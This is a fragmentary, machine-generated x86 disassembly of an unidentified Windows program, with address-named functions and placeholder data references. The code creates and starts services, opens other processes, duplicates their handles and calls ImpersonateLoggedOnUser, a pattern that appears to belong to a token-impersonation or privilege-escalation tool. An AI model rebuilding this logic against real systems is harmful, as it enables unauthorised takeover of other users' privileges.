call sub_409de0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
lea edx [ ebx + 0x1c ]
push edx
push ecx
push 0x9
push ecx
push ebx
push ecx
push 0x9
push rw-data
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
jmp [ eax * 4 + jump_table_429550 ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov edx [ esp + 0x10 ]
add ebx 0x5c
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push rw-data
call sub_409de0
add esp 0x8
mov edi edx
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_429570
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452da8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
push 0x3
push r--data
xor ebx ebx
push ebx
call [ OpenSCManagerW@IAT ]
mov [ esp + 0x18 ] eax
cmp eax ebx
je r-xdata
push ebx
lea eax [ esp + 0x58 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x8
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x10
push r--data
push eax
call [ OpenServiceW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x424
jne r-xdata
cmp [ esp + 0x68 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x6
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0xc ]
xor edi edi
test cl 0x6
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x54 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
cmp [ esp + 0x14 ] ebx
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
mov edi [ esp + 0x14 ]
push ebx
push ebx
push edi
call [ StartServiceW@IAT ]
test eax eax
je r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
cmp [ esp + 0x4c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor edx edx
mov esi 0x7
push 0xc
mov eax r--data
lea ecx [ esp + 0x3c ]
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] dx
call sub_401c90
mov [ esp + 0x80 ] ebx
xor eax eax
mov [ esp + 0x1c ] ax
push ebx
mov eax r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] esi
mov [ esp + 0x30 ] ebx
call sub_401c90
lea ecx [ esp + 0x1c ]
push ecx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x84 ] 0x1
call sub_40e3f0
add esp 0x4
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
lea edx [ esp + 0x3c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x7
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x80 ] 0xffffffff
cmp [ esp + 0x4c ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x38 ]
push edx
call sub_43811c
mov edx [ esp + 0x1c ]
add esp 0x4
push edx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
push ebx
lea edx [ esp + 0x58 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x5
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
lea esi [ esp + 0x13 ]
lea eax [ esp + 0x1c ]
mov [ esp + 0x13 ] bl
call sub_40e570
test al al
je r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
lea eax [ esp + 0x58 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
cmp [ esp + 0x13 ] bl
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea esi [ esp + 0x54 ]
call sub_4218d0
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ esp + 0x30 ] 0x8
mov eax [ esp + 0x1c ]
jae r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
xor eax eax
mov [ esp + 0x80 ] 0xffffffff
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] ax
cmp [ esp + 0x4c ] esi
jb r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
push ebx
mov edx [ esp + 0x1c ]
push ebx
push ebx
push ebx
push ebx
push eax
push 0x1
push 0x2
push 0x1
push 0x60010
push r--data
push r--data
push edx
call [ CreateServiceW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax ebx
je r-xdata
lea eax [ esp + 0x1c ]
push ebx
push eax
call sub_402d50
or eax 0x4
mov ecx [ esp + 0x38 ]
push ecx
call sub_43811c
add esp 0x4
jmp r-xdata
push ebx
lea edx [ esp + 0x58 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_408150
jmp r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ esp + 0x14 ]
call sub_40d3f0
test al al
je r-xdata
push ebx
lea eax [ esp + 0x58 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x90 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
lea esi [ esp + 0x54 ]
mov [ esp + 0x80 ] 0x1
call sub_4218d0
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp esi ebx
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov esi 0x8
cmp [ esp + 0x30 ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
push ebx
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_429c40
push ebp
mov ebp esp
push 0xffffffff
push sub_453c70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x174
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x17c ] esi
mov [ ebp - 0x180 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x174 ] ax
mov ebx 0x7
push 0x3
mov eax r--data
lea ecx [ ebp - 0x174 ]
mov [ ebp - 0x17c ] 0x1
mov [ ebp - 0x178 ] sub_42a890
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x164 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x158 ] cx
push 0x50
mov eax r--data
lea ecx [ ebp - 0x158 ]
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
call sub_401c90
lea eax [ ebp - 0x178 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x4
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x100 ] sub_42a900
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0xe0 ] ax
push 0xf
mov eax r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x138 ] cx
push ebx
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x13c ] sub_42a910
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x49
mov eax r--data
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] dx
call sub_401c90
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x88 ] sub_42a980
xor eax eax
mov [ ebp - 0x84 ] ax
push 0x4
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x68 ] cx
push 0x13
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
xor edx edx
push ebx
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_42a7d0
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x9
xor eax eax
mov [ ebp - 0x2c ] ax
push 0x1f
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
call sub_4173f0
xor ecx ecx
mov [ ebp - 0xc0 ] cx
push 0x4
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_42a0e0
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0xb
xor edx edx
push 0x37
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0xc
call sub_4173f0
cmp [ ebp - 0x90 ] 0x8
jb r-xdata
xor ecx ecx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] cx
jb r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] ax
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] dx
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] cx
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] ax
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
jb r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] cx
jb r-xdata
mov eax [ ebp - 0x11c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
mov [ ebp - 0x138 ] ax
jb r-xdata
mov edx [ ebp - 0x138 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] dx
jb r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x144 ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] cx
jb r-xdata
mov eax [ ebp - 0xfc ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x160 ] 0x8
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x148 ] esi
mov [ ebp - 0x158 ] ax
jb r-xdata
mov edx [ ebp - 0x158 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x174 ]
push ecx
call sub_43811c
add esp 0x4
sub_42a0e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4532fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xe0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
push rw-data
mov [ esp + 0x38 ] eax
call sub_409de0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + edi + 0xc ]
xor ebx ebx
xor esi esi
test cl 0x6
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
cmp esi ebx
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx edi
call sub_408340
mov edx [ edi ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
cmp esi ebx
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
push 0x10
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov [ esp + 0x24 ] ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x24 ] eax
jmp r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov [ esp + 0x1c ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x1c ] edi
jmp r-xdata
mov edi [ esp + 0x24 ]
xor ecx ecx
call sub_40b0d0
push 0x10
mov [ esp + 0x1f ] al
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
push ebx
lea ecx [ esp + 0x88 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xf8 ] 0x6
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov edx [ edi ]
mov eax [ edx + 0x4 ]
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov esi [ edi ]
mov [ esp + 0x28 ] esi
cmp esi [ edi + 0x4 ]
je r-xdata
push ebx
call sub_40e5c0
add esp 0x4
test al al
je r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test ebx ebx
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp edi ebx
je r-xdata
mov edx [ esi ]
push edx
push ebx
push 0x40
call [ OpenProcess@IAT ]
mov ebx eax
xor edi edi
mov [ esp + 0x2c ] ebx
cmp ebx edi
je r-xdata
cmp [ esp + 0x98 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov al 0x1
mov ecx [ esp + 0xe0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xc8 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x1c ]
add esi 0x10
xor ebx ebx
mov [ esp + 0x28 ] esi
cmp esi [ eax + 0x4 ]
jne r-xdata
push 0x2
push edi
push edi
lea eax [ esp + 0x2c ]
push eax
call [ GetCurrentProcess@IAT ]
movzx ecx [ esi + 0x6 ]
push eax
push ecx
push ebx
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov edx [ esp + 0x84 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
push edi
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
call sub_43811c
add esp 0x4
push eax
call sub_43811c
add esp 0x4
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
xor edx edx
mov [ esp + 0xb4 ] 0x7
mov [ esp + 0xb0 ] edi
mov [ esp + 0xa0 ] dx
mov [ esp + 0xe8 ] edi
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
mov edi [ esp + 0x20 ]
push eax
call sub_40e710
add esp 0x4
test al al
je r-xdata
mov edi [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
push ecx
call [ CloseHandle@IAT ]
mov [ esp + 0xe8 ] 0xffffffff
cmp [ esp + 0xb4 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
movzx ecx [ eax ]
mov eax [ eax + 0x4 ]
shr ecx 0x1
push ecx
lea ecx [ esp + 0xa4 ]
call sub_401c90
mov edx [ esp + 0x14 ]
push edx
call sub_438111
mov eax [ esp + 0xa4 ]
add esp 0x4
cmp [ esp + 0xb4 ] 0x8
jae r-xdata
mov edx [ esp + 0xa0 ]
push edx
call sub_43811c
add esp 0x4
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0xa0 ]
cmp [ esp + 0x1b ] al
je r-xdata
push 0x40
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esi ]
push edx
push eax
call sub_40bf90
add esp 0x8
test al al
je r-xdata
mov [ eax + 0x34 ] ebx
xor ecx ecx
mov [ eax + 0x38 ] 0x7
mov [ eax + 0x24 ] cx
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0x7
xor esi esi
xor ecx ecx
mov [ esp + 0x7c ] eax
mov [ esp + 0x78 ] esi
mov [ esp + 0x68 ] cx
xor edx edx
mov [ esp + 0x98 ] eax
mov [ esp + 0x94 ] esi
mov [ esp + 0x84 ] dx
lea eax [ esp + 0x84 ]
push eax
lea ecx [ esp + 0x6c ]
mov [ esp + 0xec ] 0x2
mov edi [ esp + 0x24 ]
push ecx
call sub_40d650
add esp 0x8
test al al
je r-xdata
mov ebx [ esp + 0x2c ]
cmp [ ebx + 0x38 ] 0x8
jb r-xdata
push esi
lea edx [ esp + 0xc0 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push rw-data
mov [ esp + 0xf0 ] 0x5
call sub_40a0a0
add esp 0x8
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x38 ] 0x7
mov [ ebx + 0x34 ] 0x0
push ebx
mov [ ebx + 0x24 ] ax
call sub_43811c
add esp 0x4
mov eax [ ebx + 0x24 ]
push eax
call sub_43811c
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax r--data
jmp r-xdata
cmp [ esp + 0x7c ] 0x8
mov ecx [ esp + 0x68 ]
jae r-xdata
mov eax [ eax ]
push eax
push ecx
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x68 ]
lea esi [ esp + 0x84 ]
call sub_4218d0
lea esi [ esp + 0x68 ]
call sub_4218d0
mov esi [ esp + 0x28 ]
push esi
lea edx [ esp + 0x48 ]
push 0x5
push edx
call sub_4374b3
add esp 0xc
mov ecx eax
mov esi rw-data
call sub_40e920
mov esi eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push 0x0
lea edx [ esp + 0x38 ]
mov ecx 0x20
push 0x19
push edx
mov [ eax + esi + 0x40 ] cx
call sub_4374b3
mov edi [ esp + 0x34 ]
add esp 0xc
push r--data
push ecx
mov ecx [ edi ]
push ecx
push esi
mov [ esp + 0x24 ] eax
call sub_408170
add esp 0x4
push eax
call sub_409de0
mov ecx [ esp + 0x1c ]
mov esi eax
call sub_40e920
mov esi eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
push 0x0
lea edx [ esp + 0x60 ]
mov ecx 0x20
push 0x5
push edx
mov [ eax + esi + 0x40 ] cx
call sub_4374b3
add esp 0x14
push r--data
push sub_418ea0
lea ecx [ ebx + 0x24 ]
push ecx
push sub_418e80
mov [ esp + 0x24 ] eax
call sub_40e790
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_40e790
push eax
call sub_409de0
mov ecx [ esp + 0x1c ]
add esp 0x8
mov esi eax
call sub_40e920
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
push 0x9
add ecx eax
push ecx
mov edx 0x20
mov [ ecx + 0x40 ] dx
lea ecx [ esp + 0x70 ]
push ecx
push ecx
push 0x5c
push ecx
lea edx [ esp + 0x9c ]
push edx
push ecx
push 0x9
push ecx
movzx ecx [ edi + 0x6 ]
push ecx
push eax
call sub_41a660
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
lea esi [ esp + 0x20 ]
call sub_40d6d0
test al al
je r-xdata
push 0x0
lea ecx [ esp + 0xc0 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0xf0 ] 0x4
push r--data
jmp r-xdata
mov edx [ esp + 0x20 ]
push edx
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_408150
jmp r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ esp + 0x84 ]
call sub_4218d0
lea esi [ esp + 0x68 ]
call sub_4218d0
lea esi [ esp + 0xa0 ]
call sub_4218d0
jmp r-xdata
push eax
lea eax [ esp + 0xc0 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0xf0 ] 0x3
push r--data
lea esi [ esp + 0xbc ]
call sub_4218d0
sub_42a7d0
push ebp
mov ebp esp
and esp 0xfffffff8
push esi
push edi
push 0x29
